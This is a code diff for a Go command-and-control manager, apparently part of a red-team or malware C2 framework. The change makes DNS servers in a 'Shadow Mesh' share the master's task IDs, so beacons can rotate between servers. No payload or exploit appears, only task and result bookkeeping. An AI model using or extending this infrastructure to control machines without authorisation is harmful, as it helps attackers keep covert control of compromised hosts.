@@ -1482,24 +1482,16 @@ func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, master
 		return
 	}
 
-	// Get master task ID
-	c2.mutex.RLock()
-	masterTaskID, hasMasterID := c2.masterTaskIDs[taskID]
-	c2.mutex.RUnlock()
-
-	submitTaskID := taskID
-	if hasMasterID {
-		submitTaskID = masterTaskID
-	}
-
+	// SHADOW MESH: taskID is already the Master task ID (no mapping needed)
+	// All DNS servers use the same Master task ID from sync
 	if c2.debug {
-		logf("[C2] Flushing batch of %d chunks for task %s", len(batch), submitTaskID)
+		logf("[C2] Flushing batch of %d chunks for task %s", len(batch), taskID)
 	}
 
 	// Submit each chunk in the batch
 	var lastComplete bool
 	for _, chunk := range batch {
-		taskComplete, err := masterClient.SubmitResult(submitTaskID, chunk.BeaconID, chunk.ChunkIndex, chunk.TotalChunks, chunk.Data)
+		taskComplete, err := masterClient.SubmitResult(taskID, chunk.BeaconID, chunk.ChunkIndex, chunk.TotalChunks, chunk.Data)
 		if err != nil {
 			if c2.debug {
 				logf("[C2] Failed to submit chunk %d in batch: %v", chunk.ChunkIndex, err)
@@ -2113,25 +2105,25 @@ func (c2 *C2Manager) AddTask(beaconID, command string) string {
 }
 
 // AddTaskFromMaster adds a task received from the master server
-// It tracks both the local task ID and the master's task ID for result submission
+// In Shadow Mesh mode, all DNS servers use the same Master task ID - no local IDs
 func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) string {
 	c2.mutex.Lock()
 	defer c2.mutex.Unlock()
 
-	// Generate local task ID
-	c2.taskCounter++
-	localTaskID := fmt.Sprintf("T%04d", c2.taskCounter)
+	// SHADOW MESH: Use Master's task ID directly (all servers use same ID)
+	// This ensures beacons use consistent task IDs when rotating between servers
+	taskID := masterTaskID
 
 	task := &Task{
-		ID:        localTaskID,
+		ID:        taskID,
 		BeaconID:  beaconID,
 		Command:   command,
 		Status:    "pending",
 		CreatedAt: time.Now(),
 	}
 
-	c2.tasks[localTaskID] = task
-	c2.masterTaskIDs[localTaskID] = masterTaskID // Track master task ID
+	c2.tasks[taskID] = task
+	// No need for masterTaskIDs mapping - we use Master ID directly
 
 	// Save task to database (async to avoid blocking)
 	if c2.db != nil {
@@ -2145,11 +2137,11 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 	// Add to beacon's task queue
 	if beacon, exists := c2.beacons[beaconID]; exists {
 		beacon.TaskQueue = append(beacon.TaskQueue, *task)
-		logf("[C2] Added task %s (master: %s) for beacon %s: %s", localTaskID, masterTaskID, beaconID, command)
-		return localTaskID
+		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
+		return taskID
 	}
 
-	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, localTaskID)
+	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
 	return ""
 }
 
